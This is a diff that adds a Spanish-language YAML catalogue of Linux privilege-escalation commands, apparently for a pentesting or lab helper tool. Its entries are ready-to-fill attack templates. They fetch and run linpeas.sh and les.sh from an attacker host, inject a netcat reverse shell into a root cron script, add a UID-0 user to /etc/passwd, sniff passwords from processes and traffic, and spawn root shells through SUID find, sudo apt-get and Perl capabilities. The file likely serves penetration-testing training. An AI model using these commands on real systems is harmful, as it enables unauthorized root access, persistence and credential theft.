@@ -1,0 +1,188 @@
+tools:
+  - id: linpeas
+    name: "LinPEAS - Automated Enum"
+    description: "Enumeración automática completa para PrivEsc en Linux: SUID, sudo, cron, credenciales, etc."
+    command: "curl -L http://{lhost}:{lport}/linpeas.sh | sh"
+    params:
+      - name: lhost
+        label: "IP atacante (HTTP server)"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto HTTP"
+        placeholder: "80"
+        default: "80"
+    tags: [privesc, linux, linpeas, automated]
+    notes: "En Kali: cp /usr/share/peass/linpeas/linpeas.sh . && python3 -m http.server 80"
+
+  - id: unix_privesc_check
+    name: "unix-privesc-check"
+    description: "Script bash preinstalado en Kali para detectar misconfigs de PrivEsc en Linux"
+    command: "unix-privesc-check standard 2>/dev/null | tee /tmp/privesc_check.txt"
+    params: []
+    tags: [privesc, linux, automated, unix-privesc-check]
+    notes: "Transferir al objetivo: scp /usr/bin/unix-privesc-check user@target:/tmp/"
+
+  - id: sudo_list
+    name: "Linux - sudo -l (Permisos Sudo)"
+    description: "Lista todos los comandos que el usuario actual puede ejecutar con sudo"
+    command: "sudo -l"
+    params: []
+    tags: [privesc, linux, sudo, enumeration]
+    notes: "Si aparece (ALL : ALL) ALL → acceso root directo con sudo -i. Consultar GTFOBins para comandos específicos."
+
+  - id: suid_find
+    name: "Linux - Buscar Binarios SUID"
+    description: "Busca binarios con el bit SUID activo. Pueden ser abusados para escalar a root."
+    command: "find / -perm -u=s -type f 2>/dev/null"
+    params: []
+    tags: [privesc, linux, suid, enumeration]
+    notes: "Consultar GTFOBins (gtfobins.github.io) con el binario encontrado para ver cómo explotar."
+
+  - id: capabilities_find
+    name: "Linux - Buscar Capabilities Peligrosas"
+    description: "Busca binarios con Linux capabilities que puedan permitir PrivEsc (cap_setuid, cap_net_raw, etc.)"
+    command: "/usr/sbin/getcap -r / 2>/dev/null"
+    params: []
+    tags: [privesc, linux, capabilities, enumeration]
+    notes: "cap_setuid+ep en perl/python = root shell. Ver GTFOBins para el binario concreto."
+
+  - id: cron_enum
+    name: "Linux - Enumerar Cron Jobs"
+    description: "Revisa cron jobs del sistema en busca de scripts con permisos incorrectos ejecutados por root"
+    command: "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null; grep 'CRON' /var/log/syslog 2>/dev/null | tail -20"
+    params: []
+    tags: [privesc, linux, cron, enumeration]
+    notes: "Si un script ejecutado por root tiene permisos de escritura para el usuario actual: inyectar reverse shell."
+
+  - id: writable_dirs
+    name: "Linux - Directorios Escribibles"
+    description: "Busca directorios escribibles por el usuario actual (útil para buscar cron scripts vulnerables)"
+    command: "find / -writable -type d 2>/dev/null | grep -v proc"
+    params: []
+    tags: [privesc, linux, writable, enumeration]
+
+  - id: passwd_writable
+    name: "Linux - /etc/passwd Escribible → Root"
+    description: "Si /etc/passwd es escribible, añade un usuario root2 con contraseña conocida"
+    command: "openssl passwd {password}; echo 'root2:{hash}:0:0:root:/root:/bin/bash' >> /etc/passwd; su root2"
+    params:
+      - name: password
+        label: "Contraseña para root2"
+        placeholder: "w00t"
+        required: true
+      - name: hash
+        label: "Hash generado por openssl passwd"
+        placeholder: "Fdzt.eqJQ4s0g"
+        required: true
+    tags: [privesc, linux, passwd, root, uidzero]
+    notes: "Primero ejecutar 'openssl passwd <password>' para obtener el hash, luego construir la línea."
+
+  - id: env_vars_check
+    name: "Linux - Variables de Entorno (credenciales)"
+    description: "Muestra variables de entorno que pueden contener credenciales o datos sensibles"
+    command: "env; cat ~/.bashrc 2>/dev/null; cat ~/.bash_profile 2>/dev/null; cat ~/.profile 2>/dev/null"
+    params: []
+    tags: [privesc, linux, credentials, environment, enumeration]
+    notes: "Buscar patrones: PASSWORD, SECRET, KEY, TOKEN, CREDENTIAL, API_KEY."
+
+  - id: bash_history
+    name: "Linux - Historial de Bash"
+    description: "Lee el historial de comandos bash de todos los usuarios accesibles"
+    command: "cat ~/.bash_history 2>/dev/null; find /home -name '.bash_history' -readable 2>/dev/null | xargs cat"
+    params: []
+    tags: [privesc, linux, history, credentials, bash]
+
+  - id: process_sniff
+    name: "Linux - Sniffar Procesos en Tiempo Real (credenciales)"
+    description: "Monitoriza procesos buscando contraseñas pasadas como argumentos (útil en scripts automáticos)"
+    command: "watch -n 1 \"ps -aux | grep -i 'pass\\|secret\\|key\\|credential'\""
+    params: []
+    tags: [privesc, linux, processes, credentials, monitoring]
+    notes: "Ejecutar durante varios minutos. Puede capturar contraseñas de scripts cron que se ejecutan con credenciales."
+
+  - id: tcpdump_sniff
+    name: "Linux - Sniffar Tráfico de Red Local (credenciales)"
+    description: "Captura tráfico en loopback buscando contraseñas en claro (requiere sudo o cap_net_raw)"
+    command: "sudo tcpdump -i lo -A 2>/dev/null | grep -i 'pass\\|user\\|login\\|credential'"
+    params: []
+    tags: [privesc, linux, tcpdump, credentials, network]
+
+  - id: kernel_version
+    name: "Linux - Versión de Kernel (para kernel exploits)"
+    description: "Obtiene versión de kernel y arquitectura para buscar exploits locales (DirtyPipe, etc.)"
+    command: "uname -a; cat /etc/issue; arch; cat /proc/version"
+    params: []
+    tags: [privesc, linux, kernel, enumeration]
+    notes: "Buscar CVEs con: searchsploit linux kernel <version>. También LES (Linux Exploit Suggester)."
+
+  - id: linux_exploit_suggester
+    name: "Linux Exploit Suggester (LES)"
+    description: "Sugiere exploits de kernel basados en la versión del sistema"
+    command: "curl -L http://{lhost}:{lport}/les.sh | bash"
+    params:
+      - name: lhost
+        label: "IP atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto HTTP"
+        placeholder: "80"
+        default: "80"
+    tags: [privesc, linux, kernel, les, automated]
+    notes: "Descargar: https://github.com/mzet-/linux-exploit-suggester"
+
+  - id: installed_packages
+    name: "Linux - Paquetes Instalados"
+    description: "Lista aplicaciones instaladas para buscar versiones vulnerables"
+    command: "dpkg -l 2>/dev/null; rpm -qa 2>/dev/null"
+    params: []
+    tags: [privesc, linux, packages, enumeration]
+
+  - id: cron_reverse_shell
+    name: "Linux - Inyectar Reverse Shell en Cron Script"
+    description: "Añade reverse shell a un script ejecutado por cron como root (si el script es escribible)"
+    command: "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f' >> {script_path}"
+    params:
+      - name: script_path
+        label: "Ruta del script cron vulnerable"
+        placeholder: "/home/joe/.scripts/user_backups.sh"
+        required: true
+      - name: lhost
+        label: "IP atacante (listener)"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto listener"
+        placeholder: "4444"
+        default: "4444"
+    tags: [privesc, linux, cron, reverse-shell, injection]
+    notes: "Verificar permisos del script con: ls -la <script_path>. Esperar hasta 1 minuto para que cron lo ejecute."
+
+  - id: gtfobins_suid_bash
+    name: "GTFOBins - Escalar con find SUID"
+    description: "Escalar a root si /usr/bin/find tiene el bit SUID (o cualquier binario que permita exec)"
+    command: "find /home/{user}/Desktop -exec \"/usr/bin/bash\" -p \\;"
+    params:
+      - name: user
+        label: "Usuario actual"
+        placeholder: "joe"
+        required: true
+    tags: [privesc, linux, suid, find, gtfobins]
+    notes: "Adaptar según el binario SUID encontrado. Consultar gtfobins.github.io para el binario específico."
+
+  - id: sudo_apt_privesc
+    name: "GTFOBins - PrivEsc via sudo apt-get"
+    description: "Escalar a root si el usuario puede ejecutar apt-get con sudo (via changelog)"
+    command: "sudo apt-get changelog apt\n!/bin/sh"
+    params: []
+    tags: [privesc, linux, sudo, apt-get, gtfobins]
+    notes: "Ejecutar la primera línea, cuando abra less, escribir !/bin/sh"
+
+  - id: capabilities_perl
+    name: "GTFOBins - PrivEsc via capabilities en Perl"
+    description: "Escalar a root si perl tiene cap_setuid+ep activado (getcap)"
+    command: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+    params: []
+    tags: [privesc, linux, capabilities, perl, gtfobins]
+    notes: "Verificar con: /usr/sbin/getcap -r / 2>/dev/null | grep perl"
